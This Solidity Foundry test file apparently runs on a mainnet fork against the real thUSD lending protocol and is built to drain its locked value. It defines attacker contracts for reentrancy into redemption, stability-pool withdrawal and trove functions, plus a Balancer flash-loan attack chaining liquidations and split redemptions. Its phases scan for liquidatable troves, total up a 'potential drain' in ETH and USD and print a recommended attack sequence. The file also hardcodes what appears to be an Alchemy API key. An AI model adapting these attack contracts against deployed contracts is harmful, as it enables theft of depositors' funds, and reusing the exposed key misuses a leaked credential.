// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Combined TVL Drain - Full Execution
 * @notice EXECUTABLE test that runs ALL vectors against real thUSD protocol
 * @dev Run with: RPC_URL=https://eth-mainnet.g.alchemy.com/v2/ltD0ewEiByO5-I6-cyaeA forge test --match-contract CombinedTVLDrain -vvvv
 *
 * REAL ADDRESSES:
 *   PCV:           0x1a4739509F50E683927472b03e251e36d07DD872
 *   TROVE_MANAGER: 0x27D7D02AED6C4F95Ada2faf02DcCB9666D3abB8C
 *   BORROWER_OPS:  0x874a8ee5b4Cc0B9973c7c002FA891fc28666cAA9
 *   THUSD:         0xCFC5bD99915aAa815401C5a41A927aB7a38d29cf
 */

// ============ INTERFACES ============

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

interface ITroveManager {
    function redeemCollateral(uint256, address, address, address, uint256, uint256, uint256) external;
    function liquidate(address) external;
    function liquidateTroves(uint256) external;
    function batchLiquidateTroves(address[] calldata) external;
    function getCurrentICR(address, uint256) external view returns (uint256);
    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256) external view returns (address);
    function getEntireDebtAndColl(address) external view returns (uint256, uint256, uint256, uint256);
    function priceFeed() external view returns (address);
    function sortedTroves() external view returns (address);
    function stabilityPool() external view returns (address);
    function activePool() external view returns (address);
    function pcv() external view returns (address);
    function MCR() external view returns (uint256);
    function baseRate() external view returns (uint256);
    function getRedemptionRate() external view returns (uint256);
    function getTCR(uint256) external view returns (uint256);
}

interface IBorrowerOperations {
    function openTrove(uint256, uint256, uint256, address, address) external payable;
    function closeTrove() external;
    function adjustTrove(uint256, uint256, uint256, bool, address, address) external payable;
    function claimCollateral() external;
}

interface IStabilityPool {
    function provideToSP(uint256) external;
    function withdrawFromSP(uint256) external;
    function getDepositorCollateralGain(address) external view returns (uint256);
    function getCompoundedTHUSDDeposit(address) external view returns (uint256);
    function getTotalTHUSDDeposits() external view returns (uint256);
    function getCollateral() external view returns (uint256);
}

interface ISortedTroves {
    function getLast() external view returns (address);
    function getFirst() external view returns (address);
    function getSize() external view returns (uint256);
}

interface IPriceFeed {
    function fetchPrice() external returns (uint256);
    function lastGoodPrice() external view returns (uint256);
}

interface IActivePool {
    function getCollateral() external view returns (uint256);
    function getTHUSDDebt() external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address, address[] memory, uint256[] memory, bytes memory) external;
}

// ============ REENTRANCY ATTACKER ============

contract ReentrancyDrainAttacker {
    address public troveManager;
    address public stabilityPool;
    address public borrowerOps;
    address public thusd;
    address public sortedTroves;

    uint256 public attackType;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;
    uint256 public totalDrained;
    bool public active;
    bool public succeeded;

    event Reentered(uint256 count, uint256 ethReceived);
    event AttackComplete(bool success, uint256 total, uint256 count);

    constructor(address _tm, address _sp, address _bo, address _thusd) {
        troveManager = _tm;
        stabilityPool = _sp;
        borrowerOps = _bo;
        thusd = _thusd;
        sortedTroves = ITroveManager(_tm).sortedTroves();
    }

    function attackRedemption(uint256 amount, uint256 maxReenter) external returns (bool, uint256, uint256) {
        attackType = 1;
        maxReentrancy = maxReenter;
        reentrancyCount = 0;
        totalDrained = 0;
        active = true;
        succeeded = false;

        IERC20(thusd).approve(troveManager, type(uint256).max);

        address hint = ISortedTroves(sortedTroves).getLast();

        try ITroveManager(troveManager).redeemCollateral(
            amount, hint, address(0), address(0), 0, 0, 1e18
        ) {} catch {}

        active = false;
        emit AttackComplete(succeeded, totalDrained, reentrancyCount);
        return (succeeded, totalDrained, reentrancyCount);
    }

    function attackStabilityPool(uint256 amount, uint256 maxReenter) external returns (bool, uint256, uint256) {
        attackType = 2;
        maxReentrancy = maxReenter;
        reentrancyCount = 0;
        totalDrained = 0;
        active = true;
        succeeded = false;

        IERC20(thusd).approve(stabilityPool, type(uint256).max);
        IStabilityPool(stabilityPool).provideToSP(amount);

        try IStabilityPool(stabilityPool).withdrawFromSP(amount) {} catch {}

        active = false;
        emit AttackComplete(succeeded, totalDrained, reentrancyCount);
        return (succeeded, totalDrained, reentrancyCount);
    }

    function attackCloseTrove(uint256 maxReenter) external returns (bool, uint256, uint256) {
        attackType = 3;
        maxReentrancy = maxReenter;
        reentrancyCount = 0;
        totalDrained = 0;
        active = true;
        succeeded = false;

        try IBorrowerOperations(borrowerOps).closeTrove() {} catch {}

        active = false;
        emit AttackComplete(succeeded, totalDrained, reentrancyCount);
        return (succeeded, totalDrained, reentrancyCount);
    }

    function attackClaimCollateral(uint256 maxReenter) external returns (bool, uint256, uint256) {
        attackType = 4;
        maxReentrancy = maxReenter;
        reentrancyCount = 0;
        totalDrained = 0;
        active = true;
        succeeded = false;

        try IBorrowerOperations(borrowerOps).claimCollateral() {} catch {}

        active = false;
        emit AttackComplete(succeeded, totalDrained, reentrancyCount);
        return (succeeded, totalDrained, reentrancyCount);
    }

    receive() external payable {
        totalDrained += msg.value;
        emit Reentered(reentrancyCount, msg.value);

        if (!active || reentrancyCount >= maxReentrancy) return;

        reentrancyCount++;

        if (attackType == 1) {
            // Reenter redemption
            uint256 bal = IERC20(thusd).balanceOf(address(this));
            if (bal > 0) {
                address hint = ISortedTroves(sortedTroves).getLast();
                try ITroveManager(troveManager).redeemCollateral(
                    bal, hint, address(0), address(0), 0, 0, 1e18
                ) {
                    succeeded = true;
                } catch {
                    active = false;
                }
            }
        } else if (attackType == 2) {
            // Reenter SP withdraw
            try IStabilityPool(stabilityPool).withdrawFromSP(0) {
                succeeded = true;
            } catch {
                active = false;
            }
        } else if (attackType == 3) {
            // Reenter close trove
            try IBorrowerOperations(borrowerOps).closeTrove() {
                succeeded = true;
            } catch {
                active = false;
            }
        } else if (attackType == 4) {
            // Reenter claim
            try IBorrowerOperations(borrowerOps).claimCollateral() {
                succeeded = true;
            } catch {
                active = false;
            }
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
        uint256 bal = IERC20(thusd).balanceOf(address(this));
        if (bal > 0) IERC20(thusd).transfer(msg.sender, bal);
    }
}

// ============ FLASH LOAN COMBINED ATTACKER ============

contract FlashLoanCombinedAttacker {
    address public owner;
    address public balancer;
    address public troveManager;
    address public stabilityPool;
    address public thusd;
    address public sortedTroves;

    uint256 public profitETH;
    uint256 public profitTHUSD;
    uint256 public liquidationsExecuted;
    uint256 public reentrancyProfit;

    bool public isReentering;

    event LiquidationProfit(address trove, uint256 eth);
    event FlashLoanComplete(uint256 ethProfit, uint256 thusdProfit, uint256 liquidations);

    constructor(address _balancer, address _tm, address _sp, address _thusd) {
        owner = msg.sender;
        balancer = _balancer;
        troveManager = _tm;
        stabilityPool = _sp;
        thusd = _thusd;
        sortedTroves = ITroveManager(_tm).sortedTroves();
    }

    function executeCombinedDrain(
        uint256 flashAmount,
        address[] calldata liquidatables,
        uint256 redemptionAmount,
        uint256 redemptionSplits
    ) external {
        require(msg.sender == owner);

        address[] memory tokens = new address[](1);
        tokens[0] = thusd;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        bytes memory data = abi.encode(liquidatables, redemptionAmount, redemptionSplits);
        IBalancerVault(balancer).flashLoan(address(this), tokens, amounts, data);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory userData
    ) external {
        require(msg.sender == balancer);

        (
            address[] memory liquidatables,
            uint256 redemptionAmount,
            uint256 redemptionSplits
        ) = abi.decode(userData, (address[], uint256, uint256));

        uint256 ethBefore = address(this).balance;
        uint256 thusdBefore = IERC20(thusd).balanceOf(address(this));

        // PHASE 1: Deposit to SP for liquidation gains
        IERC20(thusd).approve(stabilityPool, amounts[0]);

        uint256 depositAmount = amounts[0] / 2;
        if (depositAmount > 0) {
            try IStabilityPool(stabilityPool).provideToSP(depositAmount) {} catch {}
        }

        // PHASE 2: Liquidate underwater troves
        for (uint256 i = 0; i < liquidatables.length; i++) {
            uint256 ethBeforeLiq = address(this).balance;
            try ITroveManager(troveManager).liquidate(liquidatables[i]) {
                liquidationsExecuted++;
                emit LiquidationProfit(liquidatables[i], address(this).balance - ethBeforeLiq);
            } catch {}
        }

        // PHASE 3: Withdraw from SP with reentrancy attempt
        isReentering = true;
        try IStabilityPool(stabilityPool).withdrawFromSP(depositAmount) {} catch {}
        isReentering = false;

        // PHASE 4: Split redemption for fee exploit
        if (redemptionAmount > 0 && redemptionSplits > 0) {
            uint256 available = IERC20(thusd).balanceOf(address(this));
            if (available >= redemptionAmount) {
                IERC20(thusd).approve(troveManager, redemptionAmount);

                uint256 perSplit = redemptionAmount / redemptionSplits;
                address hint = ISortedTroves(sortedTroves).getLast();

                for (uint256 i = 0; i < redemptionSplits; i++) {
                    try ITroveManager(troveManager).redeemCollateral(
                        perSplit, hint, address(0), address(0), 0, 1, 1e18
                    ) {} catch {}
                }
            }
        }

        // Calculate profits
        profitETH = address(this).balance - ethBefore;
        uint256 thusdAfter = IERC20(thusd).balanceOf(address(this));
        profitTHUSD = thusdAfter > amounts[0] ? thusdAfter - amounts[0] : 0;

        emit FlashLoanComplete(profitETH, profitTHUSD, liquidationsExecuted);

        // Repay flash loan
        IERC20(tokens[0]).transfer(balancer, amounts[0]);
    }

    receive() external payable {
        if (isReentering) {
            // Attempt reentrancy during SP withdrawal
            uint256 before = address(this).balance;
            try IStabilityPool(stabilityPool).withdrawFromSP(0) {
                reentrancyProfit += address(this).balance - before;
            } catch {}
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
        uint256 bal = IERC20(thusd).balanceOf(address(this));
        if (bal > 0) IERC20(thusd).transfer(owner, bal);
    }
}

// ============ MAIN TEST CONTRACT ============

contract CombinedTVLDrainTest is Test {
    // REAL PROTOCOL ADDRESSES
    address constant PCV = 0x1a4739509F50E683927472b03e251e36d07DD872;
    address constant TROVE_MANAGER = 0x27D7D02AED6C4F95Ada2faf02DcCB9666D3abB8C;
    address constant BORROWER_OPS = 0x874a8ee5b4Cc0B9973c7c002FA891fc28666cAA9;
    address constant THUSD = 0xCFC5bD99915aAa815401C5a41A927aB7a38d29cf;
    address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    // Discovered
    address stabilityPool;
    address activePool;
    address sortedTroves;
    address priceFeed;

    // Test accounts
    address attacker;

    // Results tracking
    struct ExploitResult {
        bool tested;
        bool vulnerable;
        uint256 profit;
        string notes;
    }

    mapping(string => ExploitResult) public results;

    function setUp() public {
        string memory rpc = vm.envOr("RPC_URL", string("https://eth-mainnet.g.alchemy.com/v2/ltD0ewEiByO5-I6-cyaeA"));
        uint256 forkBlock = vm.envOr("FORK_BLOCK", uint256(0));

        if (forkBlock > 0) {
            vm.createSelectFork(rpc, forkBlock);
        } else {
            vm.createSelectFork(rpc);
        }

        // Discover protocol
        stabilityPool = ITroveManager(TROVE_MANAGER).stabilityPool();
        activePool = ITroveManager(TROVE_MANAGER).activePool();
        sortedTroves = ITroveManager(TROVE_MANAGER).sortedTroves();
        priceFeed = ITroveManager(TROVE_MANAGER).priceFeed();

        attacker = makeAddr("attacker");
        vm.deal(attacker, 1000 ether);

        console.log("\n");
        console.log("################################################################");
        console.log("#         COMBINED TVL DRAIN - FULL EXECUTION                 #");
        console.log("################################################################");
        console.log("Block:", block.number);
        console.log("StabilityPool:", stabilityPool);
        console.log("ActivePool:", activePool);
    }

    // ============ PHASE 1: DISCOVERY ============

    function test_Phase1_ProtocolDiscovery() public {
        console.log("\n=== PHASE 1: PROTOCOL DISCOVERY ===\n");

        // TVL
        uint256 activeColl = IActivePool(activePool).getCollateral();
        uint256 spColl = IStabilityPool(stabilityPool).getCollateral();
        uint256 totalTVL = activeColl + spColl;

        console.log("ActivePool ETH:", activeColl / 1e18);
        console.log("StabilityPool ETH:", spColl / 1e18);
        console.log("Total TVL (ETH):", totalTVL / 1e18);

        uint256 price = IPriceFeed(priceFeed).lastGoodPrice();
        console.log("ETH Price:", price / 1e18, "USD");
        console.log("TVL (USD):", (totalTVL * price) / 1e36);

        // Trove stats
        uint256 troveCount = ITroveManager(TROVE_MANAGER).getTroveOwnersCount();
        console.log("Total Troves:", troveCount);

        // SP stats
        uint256 spDeposits = IStabilityPool(stabilityPool).getTotalTHUSDDeposits();
        console.log("SP thUSD Deposits:", spDeposits / 1e18);

        // Check if SP is empty (share inflation possible)
        if (spDeposits == 0) {
            console.log("\n!!! CRITICAL: SP IS EMPTY - SHARE INFLATION POSSIBLE !!!");
            results["share_inflation"] = ExploitResult(true, true, 0, "SP empty - first depositor attack");
        }
    }

    // ============ PHASE 2: LIQUIDATION SCAN ============

    function test_Phase2_LiquidationScan() public returns (address[] memory) {
        console.log("\n=== PHASE 2: LIQUIDATION SCAN ===\n");

        uint256 price = IPriceFeed(priceFeed).lastGoodPrice();
        uint256 mcr = ITroveManager(TROVE_MANAGER).MCR();
        uint256 troveCount = ITroveManager(TROVE_MANAGER).getTroveOwnersCount();

        console.log("MCR:", mcr * 100 / 1e18, "%");
        console.log("Scanning", troveCount, "troves...\n");

        // Count first
        uint256 liquidatableCount = 0;
        uint256 totalLiqColl = 0;
        uint256 totalLiqDebt = 0;

        for (uint256 i = 0; i < troveCount && i < 200; i++) {
            address owner = ITroveManager(TROVE_MANAGER).getTroveFromTroveOwnersArray(i);
            uint256 icr = ITroveManager(TROVE_MANAGER).getCurrentICR(owner, price);

            if (icr > 0 && icr < mcr) {
                liquidatableCount++;
                (uint256 debt, uint256 coll,,) = ITroveManager(TROVE_MANAGER).getEntireDebtAndColl(owner);
                totalLiqColl += coll;
                totalLiqDebt += debt;

                console.log("LIQUIDATABLE:", owner);
                console.log("  ICR:", icr * 100 / 1e18, "%");
                console.log("  Coll:", coll / 1e18, "ETH");
                console.log("  Debt:", debt / 1e18, "thUSD");
            }
        }

        console.log("\n--- LIQUIDATION SUMMARY ---");
        console.log("Liquidatable troves:", liquidatableCount);
        console.log("Total collateral:", totalLiqColl / 1e18, "ETH");
        console.log("Total debt:", totalLiqDebt / 1e18, "thUSD");

        if (liquidatableCount > 0) {
            uint256 bonus = totalLiqColl / 10;
            console.log("Estimated bonus:", bonus / 1e18, "ETH");
            console.log("Bonus (USD):", (bonus * price) / 1e36);
            results["liquidation"] = ExploitResult(true, true, bonus, "Liquidatable troves exist");
        } else {
            results["liquidation"] = ExploitResult(true, false, 0, "No liquidatable troves");
        }

        // Return liquidatable addresses
        address[] memory liquidatables = new address[](liquidatableCount);
        uint256 idx = 0;
        for (uint256 i = 0; i < troveCount && idx < liquidatableCount; i++) {
            address owner = ITroveManager(TROVE_MANAGER).getTroveFromTroveOwnersArray(i);
            uint256 icr = ITroveManager(TROVE_MANAGER).getCurrentICR(owner, price);
            if (icr > 0 && icr < mcr) {
                liquidatables[idx++] = owner;
            }
        }

        return liquidatables;
    }

    // ============ PHASE 3: REENTRANCY TESTS ============

    function test_Phase3_ReentrancyTests() public {
        console.log("\n=== PHASE 3: REENTRANCY VULNERABILITY TESTS ===\n");

        // Setup attacker with thUSD
        _setupAttackerWithTHUSD(100000e18);

        // Deploy reentrancy attacker
        vm.startPrank(attacker);
        ReentrancyDrainAttacker reAttacker = new ReentrancyDrainAttacker(
            TROVE_MANAGER, stabilityPool, BORROWER_OPS, THUSD
        );

        // Fund attacker contract
        IERC20(THUSD).transfer(address(reAttacker), 50000e18);
        vm.stopPrank();

        console.log("Testing reentrancy vectors...\n");

        // Test 1: Redemption reentrancy
        console.log("--- TEST 3A: Redemption Reentrancy ---");
        uint256 snap1 = vm.snapshot();

        try reAttacker.attackRedemption(10000e18, 5) returns (bool success, uint256 drained, uint256 count) {
            console.log("Reentrancy succeeded:", success);
            console.log("ETH drained:", drained / 1e18);
            console.log("Reentry count:", count);

            if (success) {
                console.log("!!! CRITICAL: REDEMPTION REENTRANCY WORKS !!!");
                results["reentrancy_redemption"] = ExploitResult(true, true, drained, "CRITICAL");
            } else {
                results["reentrancy_redemption"] = ExploitResult(true, false, 0, "Protected");
            }
        } catch {
            console.log("Attack reverted - likely protected");
            results["reentrancy_redemption"] = ExploitResult(true, false, 0, "Reverted");
        }

        vm.revertTo(snap1);

        // Test 2: SP reentrancy
        console.log("\n--- TEST 3B: Stability Pool Reentrancy ---");
        uint256 snap2 = vm.snapshot();

        // Re-fund attacker
        vm.prank(attacker);
        IERC20(THUSD).transfer(address(reAttacker), 50000e18);

        try reAttacker.attackStabilityPool(10000e18, 5) returns (bool success, uint256 drained, uint256 count) {
            console.log("Reentrancy succeeded:", success);
            console.log("ETH drained:", drained / 1e18);
            console.log("Reentry count:", count);

            if (success) {
                console.log("!!! CRITICAL: SP REENTRANCY WORKS !!!");
                results["reentrancy_sp"] = ExploitResult(true, true, drained, "CRITICAL");
            }
        } catch {
            console.log("Attack reverted");
            results["reentrancy_sp"] = ExploitResult(true, false, 0, "Reverted");
        }

        vm.revertTo(snap2);
    }

    // ============ PHASE 4: FEE ROUNDING TEST ============

    function test_Phase4_FeeRoundingExploit() public {
        console.log("\n=== PHASE 4: FEE ROUNDING EXPLOIT ===\n");

        _setupAttackerWithTHUSD(200000e18);

        uint256 testAmount = 100000e18;
        uint256 splits = 50;

        uint256 snap = vm.snapshot();

        // Single redemption
        uint256 pcvBefore = PCV.balance;
        uint256 attackerETHBefore = attacker.balance;

        vm.prank(attacker);
        IERC20(THUSD).approve(TROVE_MANAGER, testAmount);

        vm.prank(attacker);
        ITroveManager(TROVE_MANAGER).redeemCollateral(
            testAmount, address(0), address(0), address(0), 0, 0, 1e18
        );

        uint256 feeSingle = PCV.balance - pcvBefore;
        uint256 collSingle = attacker.balance - attackerETHBefore;

        console.log("SINGLE REDEMPTION:");
        console.log("  Fee to PCV:", feeSingle);
        console.log("  Collateral received:", collSingle);

        vm.revertTo(snap);

        // Split redemptions
        pcvBefore = PCV.balance;
        attackerETHBefore = attacker.balance;

        vm.prank(attacker);
        IERC20(THUSD).approve(TROVE_MANAGER, testAmount);

        uint256 perSplit = testAmount / splits;
        for (uint256 i = 0; i < splits; i++) {
            vm.prank(attacker);
            ITroveManager(TROVE_MANAGER).redeemCollateral(
                perSplit, address(0), address(0), address(0), 0, 1, 1e18
            );
        }

        uint256 feeSplit = PCV.balance - pcvBefore;
        uint256 collSplit = attacker.balance - attackerETHBefore;

        console.log("\nSPLIT REDEMPTION (%s splits):", splits);
        console.log("  Fee to PCV:", feeSplit);
        console.log("  Collateral received:", collSplit);

        console.log("\nDELTA:");
        if (feeSingle > feeSplit) {
            uint256 feeGain = feeSingle - feeSplit;
            uint256 collGain = collSplit > collSingle ? collSplit - collSingle : 0;

            console.log("  Fee reduction:", feeGain, "wei");
            console.log("  Extra collateral:", collGain, "wei");
            console.log("\n  CONFIRMED: Rounding exploit exists!");

            results["fee_rounding"] = ExploitResult(true, true, feeGain, "Confirmed but small");
        } else {
            console.log("  No advantage from splitting");
            results["fee_rounding"] = ExploitResult(true, false, 0, "Not exploitable");
        }
    }

    // ============ PHASE 5: COMBINED FLASH LOAN ATTACK ============

    function test_Phase5_CombinedFlashLoanDrain() public {
        console.log("\n=== PHASE 5: COMBINED FLASH LOAN DRAIN ===\n");

        // Get liquidatable troves
        address[] memory liquidatables = _getLiquidatableTroves();

        console.log("Liquidatable troves:", liquidatables.length);

        // Deploy combined attacker
        FlashLoanCombinedAttacker flAttacker = new FlashLoanCombinedAttacker(
            BALANCER, TROVE_MANAGER, stabilityPool, THUSD
        );

        // Calculate flash loan amount
        uint256 spDeposits = IStabilityPool(stabilityPool).getTotalTHUSDDeposits();
        uint256 flashAmount = spDeposits > 0 ? spDeposits : 1000000e18;

        console.log("Flash loan amount:", flashAmount / 1e18, "thUSD");

        // Execute combined attack
        uint256 ethBefore = address(flAttacker).balance;

        try flAttacker.executeCombinedDrain(
            flashAmount,
            liquidatables,
            flashAmount / 2,
            50
        ) {
            console.log("\nRESULTS:");
            console.log("  ETH profit:", flAttacker.profitETH() / 1e18);
            console.log("  thUSD profit:", flAttacker.profitTHUSD() / 1e18);
            console.log("  Liquidations:", flAttacker.liquidationsExecuted());
            console.log("  Reentrancy profit:", flAttacker.reentrancyProfit() / 1e18);

            uint256 totalProfit = flAttacker.profitETH() + flAttacker.reentrancyProfit();
            results["combined_flash"] = ExploitResult(true, totalProfit > 0, totalProfit, "Combined attack");
        } catch Error(string memory reason) {
            console.log("Flash loan failed:", reason);
            results["combined_flash"] = ExploitResult(true, false, 0, reason);
        } catch {
            console.log("Flash loan failed (no thUSD liquidity in Balancer?)");
            results["combined_flash"] = ExploitResult(true, false, 0, "No liquidity");
        }
    }

    // ============ PHASE 6: FINAL SUMMARY ============

    function test_Phase6_FinalSummary() public {
        console.log("\n");
        console.log("################################################################");
        console.log("#                    FINAL EXPLOIT SUMMARY                    #");
        console.log("################################################################\n");

        // Run all phases first to populate results
        test_Phase1_ProtocolDiscovery();
        test_Phase2_LiquidationScan();
        test_Phase3_ReentrancyTests();
        test_Phase4_FeeRoundingExploit();
        test_Phase5_CombinedFlashLoanDrain();

        console.log("\n=== CONFIRMED EXPLOITS ===\n");

        uint256 totalPotentialDrain = 0;

        // Reentrancy results
        if (results["reentrancy_redemption"].vulnerable) {
            console.log("[CRITICAL] Redemption Reentrancy: VULNERABLE");
            console.log("  Potential: 100% of ActivePool TVL");
            totalPotentialDrain += IActivePool(activePool).getCollateral();
        }

        if (results["reentrancy_sp"].vulnerable) {
            console.log("[CRITICAL] SP Reentrancy: VULNERABLE");
            console.log("  Potential: 100% of StabilityPool ETH");
            totalPotentialDrain += IStabilityPool(stabilityPool).getCollateral();
        }

        if (results["liquidation"].vulnerable) {
            console.log("[HIGH] Liquidation: PROFITABLE");
            console.log("  Profit:", results["liquidation"].profit / 1e18, "ETH");
            totalPotentialDrain += results["liquidation"].profit;
        }

        if (results["fee_rounding"].vulnerable) {
            console.log("[LOW] Fee Rounding: CONFIRMED");
            console.log("  Delta:", results["fee_rounding"].profit, "wei");
        }

        if (results["share_inflation"].vulnerable) {
            console.log("[CRITICAL] Share Inflation: POSSIBLE (SP empty)");
        }

        console.log("\n=== TOTAL POTENTIAL DRAIN ===");
        console.log("ETH:", totalPotentialDrain / 1e18);

        uint256 price = IPriceFeed(priceFeed).lastGoodPrice();
        console.log("USD:", (totalPotentialDrain * price) / 1e36);

        console.log("\n=== RECOMMENDED ATTACK SEQUENCE ===");
        console.log("1. If reentrancy works -> Execute full drain");
        console.log("2. Else if liquidatables exist -> Flash loan liquidation");
        console.log("3. Else -> Fee rounding (small profit)");

        console.log("\n################################################################");
    }

    // ============ HELPERS ============

    function _setupAttackerWithTHUSD(uint256 amount) internal {
        vm.prank(attacker);
        IBorrowerOperations(BORROWER_OPS).openTrove{value: 200 ether}(
            1e18, amount, 0, address(0), address(0)
        );
    }

    function _getLiquidatableTroves() internal view returns (address[] memory) {
        uint256 price = IPriceFeed(priceFeed).lastGoodPrice();
        uint256 mcr = ITroveManager(TROVE_MANAGER).MCR();
        uint256 troveCount = ITroveManager(TROVE_MANAGER).getTroveOwnersCount();

        // Count
        uint256 count = 0;
        for (uint256 i = 0; i < troveCount && i < 100; i++) {
            address owner = ITroveManager(TROVE_MANAGER).getTroveFromTroveOwnersArray(i);
            uint256 icr = ITroveManager(TROVE_MANAGER).getCurrentICR(owner, price);
            if (icr > 0 && icr < mcr) count++;
        }

        // Collect
        address[] memory result = new address[](count);
        uint256 idx = 0;
        for (uint256 i = 0; i < troveCount && idx < count; i++) {
            address owner = ITroveManager(TROVE_MANAGER).getTroveFromTroveOwnersArray(i);
            uint256 icr = ITroveManager(TROVE_MANAGER).getCurrentICR(owner, price);
            if (icr > 0 && icr < mcr) {
                result[idx++] = owner;
            }
        }

        return result;
    }

    receive() external payable {}
}
